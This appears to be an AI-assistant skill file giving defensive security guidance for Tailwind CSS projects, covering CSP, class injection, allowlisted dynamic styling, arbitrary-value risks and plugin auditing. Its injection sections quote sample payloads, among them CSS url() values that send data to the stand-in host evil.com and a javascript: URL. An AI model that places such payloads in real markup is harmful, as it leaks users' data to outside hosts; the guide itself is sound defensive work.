---
name: Tailwind Security
description: This skill should be used when the user asks about "Tailwind CSP", "Content Security Policy Tailwind", "Tailwind class injection", "safe dynamic classes", "Tailwind inline styles", "Tailwind security", "arbitrary value injection", "Tailwind plugin security", or "PostCSS security". It covers security considerations for Tailwind CSS projects including CSP compatibility, class injection prevention, safe dynamic styling patterns, arbitrary value risks, and dependency auditing for Tailwind plugins.
---

# Tailwind Security

Security considerations for Tailwind CSS projects, covering Content Security Policy compatibility, class injection prevention, safe dynamic styling patterns, arbitrary value risks, and dependency auditing.

## Content Security Policy Compatibility

Tailwind CSS generates a static CSS file at build time, making it fully compatible with strict CSP policies. Unlike CSS-in-JS solutions, Tailwind does not inject `<style>` tags or use inline `style` attributes at runtime. To take advantage of this, ensure the build pipeline produces a standard `.css` file rather than relying on runtime style injection.

**Default behavior (safe)**:
- Tailwind's build output is a regular `.css` file loaded via `<link>`
- No `style-src 'unsafe-inline'` required for Tailwind utilities
- Compatible with `style-src 'self'` CSP directive

**When CSP issues arise**:
- SSR frameworks injecting `<style>` tags for critical CSS: use nonce-based CSP to authorize those tags
- Third-party UI libraries adding inline styles at runtime: audit library behavior before integrating
- Tailwind Play CDN (`@tailwindcss/browser`) uses runtime style injection: never use in production

To configure a basic CSP header that works with Tailwind's static output:

```
Content-Security-Policy: style-src 'self' 'nonce-{random}';
```

To learn more about full CSP configuration including nonce propagation and SSR considerations, refer to the [CSP Configuration Guide](references/csp-configuration.md).

## Class Injection Prevention

Never allow user input to flow into CSS class names. Even though Tailwind utility classes do not execute JavaScript, class injection can cause serious security and UX problems:

- Apply unexpected styles that break layout or create visual deception
- Exploit arbitrary value syntax for data exfiltration: `[background-image:url(https://evil.com/track?data=...)]`
- Override security-related styles, hiding warnings or changing form presentation

To prevent class injection, always validate and constrain class names to a known allowlist:

```typescript
// DANGEROUS — user controls class names
<div className={userProvidedClassName} />
<div className={`bg-${userInput}-500`} />

// SAFE — allowlist pattern
const ALLOWED_THEMES = {
  light: 'bg-white text-gray-900',
  dark: 'bg-gray-900 text-white',
  brand: 'bg-blue-600 text-white',
} as const;

type Theme = keyof typeof ALLOWED_THEMES;

function ThemedCard({ theme }: { theme: Theme }) {
  return <div className={ALLOWED_THEMES[theme]} />;
}
```

To enforce this pattern across a codebase, establish a lint rule or code review checklist that flags any dynamic class construction using string interpolation with external input.

## Safe Dynamic Styling Patterns

To build dynamic UIs without introducing injection risks, use one of these trusted patterns.

**Lookup objects**: Map user-selectable options to pre-defined class strings. Define the mapping as a constant and type the keys to constrain accepted values (as shown above).

**CVA (Class Variance Authority)**: Enforce type-safe variant boundaries to guarantee only declared variants are accepted.

```typescript
import { cva } from 'class-variance-authority';

const alert = cva('rounded-lg p-4 border-l-4', {
  variants: {
    severity: {
      info: 'bg-blue-50 border-blue-400 text-blue-700',
      warning: 'bg-yellow-50 border-yellow-400 text-yellow-700',
      error: 'bg-red-50 border-red-400 text-red-700',
    },
  },
});
// severity prop is type-checked: only 'info' | 'warning' | 'error' accepted
```

**Tailwind Merge**: Resolve class conflicts safely without user input.

```typescript
import { twMerge } from 'tailwind-merge';
// Merges component defaults with prop overrides (from trusted developer code only)
twMerge('px-4 py-2', 'px-6'); // → 'py-2 px-6'
```

Never pass user input to `twMerge` or `clsx` directly. Only merge classes from trusted, developer-defined sources. To keep this boundary clear, isolate all class merging logic into component internals and avoid exposing raw `className` props to end users.

## Arbitrary Value Injection Risks

Tailwind's arbitrary value syntax (`[...]`) accepts any CSS value, making it a potential attack vector when values originate from untrusted sources:

```html
<!-- Potentially dangerous if value comes from user input -->
<div class="bg-[url(https://evil.com/pixel.gif)]">
<div class="[content:'stolen']">
<div class="bg-[image:url(javascript:alert(1))]">
```

To mitigate arbitrary value injection risks:

- Never generate arbitrary value classes from user input under any circumstances
- Audit code for `[` brackets in dynamically constructed class strings
- Use a linter rule or custom ESLint plugin to flag arbitrary values in user-facing code paths
- Prefer theme-defined values over arbitrary values wherever possible
- To restrict arbitrary values project-wide, consider a code review policy that requires justification for each arbitrary value usage

When an arbitrary value is genuinely needed for a design requirement, hard-code it directly in the component source rather than deriving it from props, query parameters, or database fields.

## Plugin and Dependency Security

**Tailwind plugins run at build time** and have the ability to inject arbitrary CSS into the output. To prevent supply chain attacks through malicious plugins:

- Audit plugin source code before installation: check maintainer reputation, download count, and recent activity
- Pin exact versions in `package.json` to prevent unexpected updates from introducing malicious code
- Review `package-lock.json` diffs in every pull request to catch unexpected plugin changes
- Understand that a malicious plugin could inject CSS that exfiltrates data via `background-image: url()` or hides/reveals page content to deceive users

**PostCSS plugin chain trust**:

- Every PostCSS plugin in the chain can transform CSS output, not just Tailwind-specific plugins
- Audit all PostCSS plugins with the same rigor as Tailwind plugins
- Use `npm audit` and tools like `socket.dev` for comprehensive supply chain analysis
- To minimize the attack surface, keep the PostCSS plugin chain as short as possible

## Dependency Auditing Checklist

To maintain a secure Tailwind project, follow this auditing process regularly:

1. Run `npm audit` on every CI build to catch known vulnerabilities early
2. Pin Tailwind and all plugin versions in `package.json` using exact versions (no `^` or `~` prefixes)
3. Review lockfile diffs in every pull request to detect unexpected dependency changes
4. Use `npm ci` in CI pipelines (not `npm install`) to ensure exact version installation from the lockfile
5. Audit new Tailwind plugins before adding them: inspect source code, verify download counts, and check the last update date
6. Monitor third-party CSS outputs for injection patterns such as `url()` references to external domains

To automate these checks, integrate dependency scanning tools into the CI pipeline and configure alerts for newly discovered vulnerabilities in Tailwind ecosystem packages.

## References

- [CSP Configuration Guide](references/csp-configuration.md) for full CSP setup including nonce propagation, SSR integration, and testing strategies
